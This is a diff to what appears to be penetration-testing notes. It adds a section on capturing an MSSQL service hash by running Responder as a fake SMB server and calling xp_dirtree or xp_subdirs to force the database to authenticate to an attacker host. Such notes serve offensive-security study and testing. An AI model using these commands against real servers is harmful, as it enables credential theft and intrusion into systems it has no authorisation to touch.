@@ -29,7 +29,14 @@ exploit
 
 -Capturing MSSQL Service Hash:
 
-We can first use responder to create a fake 
+We can first use responder to create a fake SMB server, then have mssql verify its identity against our server with its hash:
+```
+sudo responder -I <interface>
+EXEC master..xp_dirtree '\\<ip>\<sharename>\'
+GO
+#Alternative
+EXEC master..xp_subdirs '\\<ip>\<share>\'
+```
 
 
 Post Entry:
